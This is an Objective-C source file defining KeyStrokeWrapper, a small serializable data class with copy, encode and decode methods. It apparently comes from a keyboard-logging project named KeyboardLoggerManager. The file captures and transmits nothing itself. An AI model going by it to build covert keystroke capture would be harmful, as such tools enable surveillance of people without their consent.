//
//  KeyStrokeWrapper.m
//  KeyboardLoggerManager
//
//  Created by Makara Khloth on 6/18/16.
//  Copyright © 2016 Makara Khloth. All rights reserved.
//

#import "KeyStrokeWrapper.h"
#import "KeyStrokeInfo.h"

@implementation KeyStrokeWrapper

@synthesize mKeyStrokeInfo;
@synthesize mKeyStrokeInfoAsscoiate;
@synthesize mKeyStrokeInteruptID;

- (id)copyWithZone:(NSZone *)zone {
    KeyStrokeWrapper *myCopy = [[[self class] allocWithZone:zone] init];
    if (myCopy) {
        myCopy.mKeyStrokeInfo = self.mKeyStrokeInfo;
        myCopy.mKeyStrokeInfoAsscoiate = self.mKeyStrokeInfoAsscoiate;
        myCopy.mKeyStrokeInteruptID = self.mKeyStrokeInteruptID;
    }
    return myCopy;
}

- (void)encodeWithCoder:(NSCoder *)aCoder {
    [aCoder encodeObject:self.mKeyStrokeInfo];
    [aCoder encodeObject:self.mKeyStrokeInfoAsscoiate];
    [aCoder encodeObject:[NSNumber numberWithInt:self.mKeyStrokeInteruptID]];
}

- (id)initWithCoder:(NSCoder *)aDecoder {
    self = [super init];
    if (self) {
        self.mKeyStrokeInfo = [aDecoder decodeObject];
        self.mKeyStrokeInfoAsscoiate = [aDecoder decodeObject];
        self.mKeyStrokeInteruptID = [[aDecoder decodeObject] intValue];
    }
    return self;
}

- (void) dealloc {
    self.mKeyStrokeInfo = nil;
    self.mKeyStrokeInfoAsscoiate = nil;
    [super dealloc];
}

@end
